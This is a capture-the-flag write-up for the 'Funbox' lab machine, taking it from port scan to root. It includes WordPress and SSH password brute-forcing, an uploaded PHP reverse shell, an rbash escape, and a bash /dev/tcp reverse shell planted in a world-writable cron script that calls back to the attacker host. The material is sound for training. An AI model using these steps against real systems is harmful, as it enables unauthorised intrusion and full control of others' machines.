# Funbox

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.249.77
```

Open ports discovered:

- **21** — FTP (ProFTPD, anonymous login allowed)
- **22** — SSH (OpenSSH 8.2p1 Ubuntu 4, Ubuntu Linux; protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.41, Ubuntu)
  - Redirects to `https://funbox.fritz.box/`
  - Add `funbox.fritz.box` to `/etc/hosts`:

  ```
  192.168.249.77  funbox.fritz.box
  ```

  - Additional webpages:
    - `http://funbox.fritz.box/robots.txt`
    - `http://funbox.fritz.box/secret/`
    - `http://funbox.fritz.box/index.php/wp-json`
    - `http://funbox.fritz.box/wp-trackback.php`
    - Other WordPress-related subdirectories
- **33060** — MySQL (MySQL X protocol listener)

Browse to `http://funbox.fritz.box`. The site is running WordPress. The `robots.txt` file disallows access to `/secret/`, which displays "No secrets here. Try harder!"

Run `wpscan` to enumerate WordPress users:

```
wpscan --url http://funbox.fritz.box/ -e u
```

Two usernames discovered: `admin` and `joe`.

Brute force the users' passwords:

```
wpscan --url http://funbox.fritz.box/ --usernames admin,joe --passwords /usr/share/wordlists/rockyou.txt
```

Valid credential combinations found:

- `admin:iubire`
- `joe:12345`

Login as `admin` at `http://funbox.fritz.box/wp-login.php` using `admin:iubire`. Attempt to update the `twentyseventeen` theme's `404.php` with a PHP reverse shell via the theme editor — the change is reverted with the message "You will need to upload your PHP file change by some other means, such as by using SFTP."

Try logging in via FTP as `admin` with `admin:iubire` — fails. Try logging in as `joe` with `joe:12345` — succeeds.

List files in `/home/joe`:

```
ftp> pwd
Remote directory: /home/joe

ftp> ls -al
229 Entering Extended Passive Mode (|||2454|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 joe      joe          4096 Aug 21  2020 .
drwxr-xr-x   5 root     root         4096 Nov  5 12:43 ..
lrwxrwxrwx   1 joe      joe             9 Aug 21  2020 .bash_history -> /dev/null
-rw-r--r--   1 joe      joe           220 Jun 19  2020 .bash_logout
-rw-r--r--   1 joe      joe          3771 Jun 19  2020 .bashrc
drwx------   2 joe      joe          4096 Jun 19  2020 .cache
drwxrwxr-x   3 joe      joe          4096 Jul 18  2020 .local
-rw-r--r--   1 root     root           33 Nov  5 12:44 local.txt
-rw-------   1 joe      joe           998 Jul 18  2020 mbox
-rw-r--r--   1 joe      joe           807 Jun 19  2020 .profile
drwx------   2 joe      joe          4096 Jun 22  2020 .ssh
226 Transfer complete
```

The `local.txt` flag is visible but a proper shell is preferred. Upload a PHP reverse shell to the web server root via FTP:

```
ftp> cd /var/www/html
250 CWD command successful
ftp> put reverse_shell.php
local: reverse_shell.php remote: reverse_shell.php
229 Entering Extended Passive Mode (|||19436|)
150 Opening BINARY mode data connection for reverse_shell.php
100% |************************************************************************|  5495       78.21 MiB/s    00:00 ETA
226 Transfer complete
5495 bytes sent in 00:00 (126.52 KiB/s)
```

Browse to `http://funbox.fritz.box/reverse_shell.php` and catch the reverse shell with `penelope`:

```
www-data@lab-pg-20-ubuntu20-funbox-245-199:/$ whoami
www-data
```

Retrieve the `local.txt` flag:

```
www-data@lab-pg-20-ubuntu20-funbox-245-199:/$ cat /home/joe/local.txt
e9209e0c295ae42f72ffb3828df40ed6
```

### Alternative Initial Access — Hydra SSH brute force

The same `wpscan` enumeration reveals usernames `joe` and `admin`. Instead of using the credentials via FTP, `hydra` can brute force SSH with the Rockyou wordlist:

```
hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://192.168.249.77
```

Credit: [Sanaullah Aman Korai — FunBox Walkthrough: Proving Grounds Play](https://sanaullahamankorai.medium.com/funbox-walkthrough-proving-grounds-play-5cd185a2f3f0)

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
python3 -m http.server 9001
```

On the target, download the script:

```
www-data@lab-pg-20-ubuntu20-funbox-245-199:/$ cd /tmp
www-data@lab-pg-20-ubuntu20-funbox-245-199:/tmp$ which wget
/usr/bin/wget

www-data@lab-pg-20-ubuntu20-funbox-245-199:/tmp$ wget http://192.168.45.189:9001/linux/enum/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@lab-pg-20-ubuntu20-funbox-245-199:/tmp$ chmod +x linpeas.sh
www-data@lab-pg-20-ubuntu20-funbox-245-199:/tmp$ ./linpeas.sh
```

Important findings:

```
══╣ Polkit Binary (T1548.003,T1068)
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
pkexec version 0.105
CVE-2021-4034 candidate: root-owned SUID pkexec with older upstream version; verify distro package fixes and mitigations

══╣ Analyzing Wordpress Files (limit 70)
-rwxrwxrwx 1 www-data www-data 3047 Jun 19  2020 /var/www/html/wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress');
define('DB_HOST', 'localhost');

══╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200) (T1574.009,T1574.010)
/home/funny/.backup.sh
```

The `pwnkit` kernel exploit (CVE-2021-4034) is confirmed as a viable path. However, the notes proceed via SSH login and cron job manipulation.

Log in via SSH as `joe` using `joe:12345`. The shell is a restricted bash shell (rbash). Escape it using `ed`:

```
joe@lab-pg-20-ubuntu20-funbox-245-199:~$ ed
!/bin/bash
joe@lab-pg-20-ubuntu20-funbox-245-199:/tmp$ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

Upload and run `linpeas.sh` again as `joe`. No new important findings.

Explore MySQL with the WordPress credentials discovered by `linpeas`:

```
joe@lab-pg-20-ubuntu20-funbox-245-199:/tmp$ mysql -u wordpress -p'wordpress'
```

No interesting data found.

Use `pspy64` to monitor for hidden processes:

```
joe@lab-pg-20-ubuntu20-funbox-245-199:~$ wget http://192.168.45.189:9001/linux/enum/pspy64

joe@lab-pg-20-ubuntu20-funbox-245-199:/tmp$ chmod +x pspy64
joe@lab-pg-20-ubuntu20-funbox-245-199:/tmp$ ./pspy64
...
2026/11/05 14:14:01 CMD: UID=1000  PID=138883 | tar -cf /home/funny/html.tar /var/www/html
2026/11/05 14:14:01 CMD: UID=1000  PID=138882 | /bin/bash /home/funny/.backup.sh
2026/11/05 14:14:01 CMD: UID=1000  PID=138881 | /bin/sh -c /home/funny/.backup.sh
...
2026/11/05 14:15:01 CMD: UID=0     PID=138898 | tar -cf /home/funny/html.tar /var/www/html
2026/11/05 14:15:01 CMD: UID=0     PID=138897 | /bin/bash /home/funny/.backup.sh
2026/11/05 14:15:01 CMD: UID=0     PID=138896 | /bin/sh -c /home/funny/.backup.sh
```

The script `/home/funny/.backup.sh` is a cron job executed by user `funny` (UID 1000) every 2 minutes and by `root` (UID 0) every 5 minutes. The file is world-writable, allowing modification.

Replace the contents of `/home/funny/.backup.sh` with a reverse shell:

```
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/192.168.45.189/4444 <&1'
```

Wait for the cron job to fire and catch the root reverse shell with `penelope`:

```
root@lab-pg-20-ubuntu20-funbox-245-199:~# whoami
root
```

Retrieve the `proof.txt` flag:

```
root@lab-pg-20-ubuntu20-funbox-245-199:~# cat proof.txt
d819a67c9add41cefc05d5207a1fc270
```